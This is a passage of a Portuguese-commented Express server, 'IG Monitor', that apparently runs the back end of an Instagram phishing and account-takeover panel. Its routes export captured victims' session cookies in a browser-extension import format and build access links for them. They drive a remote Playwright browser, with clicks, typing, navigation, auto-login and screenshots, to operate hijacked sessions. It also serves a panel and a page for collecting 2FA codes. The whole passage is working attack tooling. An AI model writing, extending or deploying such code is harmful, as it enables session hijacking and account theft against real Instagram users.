        const usuarioParam = (req.params.usuario && req.params.usuario !== "exportar") ? req.params.usuario : (req.query.usuario || "");
        const tenantParam = req.query.tenant || req.query.cliente || null;
        const resolved = resolverSessaoCookies(usuarioParam, tenantParam);
        if (!resolved || !resolved.sessionData) {
            return res.status(404).json({ success: false, mensagem: "Sessão de cookies não encontrada." });
        }

        const { sessionData } = resolved;
        const rawCookies = sessionData.cookies || [];
        const itemTenant = sessionData.tenant || "default";

        const cookieEditorFormat = rawCookies.map(c => ({
            domain: c.domain,
            expirationDate: c.expires && c.expires > 0 ? c.expires : undefined,
            hostOnly: !c.domain.startsWith("."),
            httpOnly: !!c.httpOnly,
            name: c.name,
            path: c.path || "/",
            sameSite: c.sameSite ? c.sameSite.toLowerCase() : "unspecified",
            secure: !!c.secure,
            session: !c.expires || c.expires <= 0,
            storeId: "0",
            value: c.value
        }));

        return res.json({
            success: true,
            tenant: itemTenant,
            usuario: sessionData.usuario,
            data_hora: sessionData.data_hora,
            url_final: sessionData.url_final || URL_FINAL_PADRAO,
            total_cookies: rawCookies.length,
            cookies: rawCookies,
            cookie_editor_json: cookieEditorFormat,
            link_acesso: `/sessaoremota.html?usuario=${encodeURIComponent(sessionData.usuario)}&tenant=${encodeURIComponent(itemTenant)}`
        });
    }
);

// ==========================================
// ROTAS DE SESSÃO REMOTA (PLAYWRIGHT)
// ==========================================
app.get("/api/remota/status", async (req, res) => {
    try {
        const resp = await fetch(`${WORKER_URL}/remota/status`);
        if (!resp.ok) throw new Error("Worker offline");
        const data = await resp.json();
        return res.json(data);
    } catch (err) {
        return res.json({
            success: true,
            status: "pronto",
            is_ready: true,
            url_atual: URL_FINAL_PADRAO,
            titulo_atual: "Instagram"
        });
    }
});

app.post("/api/remota/iniciar", async (req, res) => {
    try {
        const usuario = (req.body.usuario || "").trim();
        if (!usuario || usuario.toLowerCase() in { sessao: 1, sessaoremota: 1, acesso: 1 }) {
            return res.status(400).json({
                success: false,
                mensagem: "Nenhum usuário selecionado. Por favor, selecione um usuário capturado na lista."
            });
        }
        const resp = await fetch(`${WORKER_URL}/remota/iniciar`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ usuario, tenant: req.body.tenant })
        });
        const json = await resp.json();
        res.json(json);
    } catch (e) {
        res.status(502).json({ success: false, mensagem: "Falha ao iniciar navegador remoto no worker" });
    }
});

app.post("/api/remota/auto-login", async (req, res) => {
    try {
        const resp = await fetch(`${WORKER_URL}/remota/auto-login`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(req.body)
        });
        const json = await resp.json();
        res.json(json);
    } catch (e) {
        res.status(502).json({ success: false, mensagem: "Erro ao comunicar com worker remoto" });
    }
});

app.get("/api/remota/screenshot", async (req, res) => {
    try {
        const resp = await fetch(`${WORKER_URL}/remota/screenshot`);
        if (!resp.ok) throw new Error("Falha ao capturar");
        const buffer = await resp.arrayBuffer();
        res.set("Content-Type", "image/png");
        return res.send(Buffer.from(buffer));
    } catch (err) {
        return res.status(204).end();
    }
});

app.post("/api/remota/clique", async (req, res) => {
    try {
        const { x, y } = req.body;
        const resp = await fetch(`${WORKER_URL}/remota/clique`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ x: Math.round(Number(x)), y: Math.round(Number(y)) })
        });
        const json = await resp.json();
        res.json(json);
    } catch (e) {
        res.status(502).json({ success: false, mensagem: "Erro ao despachar clique" });
    }
});

app.post("/api/remota/navegar", async (req, res) => {
    try {
        const { url } = req.body;
        const resp = await fetch(`${WORKER_URL}/remota/navegar`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ url: String(url || "") })
        });
        const json = await resp.json();
        res.json(json);
    } catch (e) {
        res.status(502).json({ success: false, mensagem: "Erro ao navegar" });
    }
});

app.post("/api/remota/digitar", async (req, res) => {
    try {
        const { texto } = req.body;
        const resp = await fetch(`${WORKER_URL}/remota/digitar`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ texto: String(texto || "") })
        });
        const json = await resp.json();
        res.json(json);
    } catch (e) {
        res.status(502).json({ success: false, mensagem: "Erro ao digitar" });
    }
});

app.post("/api/remota/tecla", async (req, res) => {
    try {
        const { tecla } = req.body;
        const resp = await fetch(`${WORKER_URL}/remota/tecla`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ tecla: String(tecla || "") })
        });
        const json = await resp.json();
        res.json(json);
    } catch (e) {
        res.status(502).json({ success: false, mensagem: "Erro ao enviar tecla" });
    }
});

app.post("/api/remota/scroll", async (req, res) => {
    try {
        const { delta_y } = req.body;
        const resp = await fetch(`${WORKER_URL}/remota/scroll`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ delta_y: Number(delta_y || 0) })
        });
        const json = await resp.json();
        res.json(json);
    } catch (e) {
        res.status(502).json({ success: false, mensagem: "Erro ao rolar tela" });
    }
});

app.post("/api/remota/voltar", async (req, res) => {
    try {
        const resp = await fetch(`${WORKER_URL}/remota/voltar`, { method: "POST" });
        const json = await resp.json();
        res.json(json);
    } catch (e) {
        res.status(502).json({ success: false, mensagem: "Erro ao voltar" });
    }
});

app.post("/api/remota/avancar", async (req, res) => {
    try {
        const resp = await fetch(`${WORKER_URL}/remota/avancar`, { method: "POST" });
        const json = await resp.json();
        res.json(json);
    } catch (e) {
        res.status(502).json({ success: false, mensagem: "Erro ao avançar" });
    }
});

app.post("/api/remota/recarregar", async (req, res) => {
    try {
        const resp = await fetch(`${WORKER_URL}/remota/recarregar`, { method: "POST" });
        const json = await resp.json();
        res.json(json);
    } catch (e) {
        res.status(502).json({ success: false, mensagem: "Erro ao recarregar" });
    }
});

// ==========================================
// ROTAS DE PÁGINAS
// ==========================================
app.get("/painel", (req, res) => {
    res.sendFile(path.join(PUBLIC_DIR, "painel.html"));
});

app.get("/login-painel", (req, res) => {
    res.sendFile(path.join(PUBLIC_DIR, "login-painel.html"));
});

app.get(["/sessaoremota", "/sessaoremota/:usuario"], (req, res) => {
    res.sendFile(path.join(PUBLIC_DIR, "sessaoremota.html"));
});

app.get(["/sessao", "/sessao/:usuario"], (req, res) => {
    res.sendFile(path.join(PUBLIC_DIR, "sessao.html"));
});

app.get("/codigo", (req, res) => {
    res.sendFile(path.join(CODIGO_DIR, "index.html"));
});

app.get("/codigo/", (req, res) => {
    res.sendFile(path.join(CODIGO_DIR, "index.html"));
});

app.get("/health", (req, res) => {
    res.json({
        status: "ok",
        service: "ig-web",
        timestamp: new Date().toISOString()
    });
});

app.get("/", (req, res) => {
    res.sendFile(path.join(PUBLIC_DIR, "index.html"));
});

app.listen(PORT, () => {
    console.log();
    console.log("====================================");
    console.log(`Servidor IG Monitor rodando em http://localhost:${PORT}`);
    console.log(`Painel disponível em http://localhost:${PORT}/painel`);
    console.log(`Tela de 2FA em http://localhost:${PORT}/codigo/`);
    console.log("====================================");
    console.log();
});
